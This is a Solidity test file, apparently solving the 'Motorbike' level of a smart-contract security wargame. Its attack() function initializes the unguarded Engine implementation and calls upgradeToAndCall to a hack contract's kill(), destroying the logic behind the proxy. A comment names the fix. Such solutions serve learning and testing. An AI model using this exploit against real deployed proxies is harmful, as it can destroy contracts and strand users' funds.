// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {MotorbikeFactory, Motorbike, Engine} from "../levels/25_Motorbike/MotorbikeFactory.sol";
import {MotorbikeHack} from "../levels/25_Motorbike/MotorbikeHack.sol";

contract TestMotorbike is Tests {
    Engine private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new MotorbikeFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Engine(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        level.initialize(); // Don't forget to place a {_disableInitializers} in the constructor
        address hack = address(new MotorbikeHack());
        bytes memory initEncoded = abi.encodeWithSignature("kill()");
        level.upgradeToAndCall(hack, initEncoded);

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
